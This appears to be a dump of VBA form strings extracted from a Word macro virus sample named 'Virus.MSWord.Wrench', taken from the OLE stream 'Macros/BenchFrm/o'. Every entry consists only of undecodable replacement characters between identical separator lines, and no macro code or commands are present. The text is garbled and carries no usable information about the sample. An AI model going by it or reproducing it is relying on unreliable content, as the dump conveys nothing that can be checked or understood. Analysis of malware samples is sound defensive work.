- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Wrench' - OLE stream: 'Macros/BenchFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
